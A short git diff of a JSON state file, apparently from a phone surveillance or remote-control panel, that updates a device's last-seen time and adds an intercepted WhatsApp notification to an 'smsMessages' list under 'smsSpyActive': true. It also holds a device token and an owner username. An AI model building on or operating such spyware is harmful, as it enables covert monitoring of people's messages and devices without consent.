@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777062140110,
+    "lastSeen": 1777062143068,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Mengunduh 2 video",
+        "content": "dari SisuryaOfficial - Channel dan 1 file lainnya",
+        "time": "25/04 03:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777062143661
+      },
       {
         "appName": "WhatsApp",
         "sender": "Mengunduh 2 video",
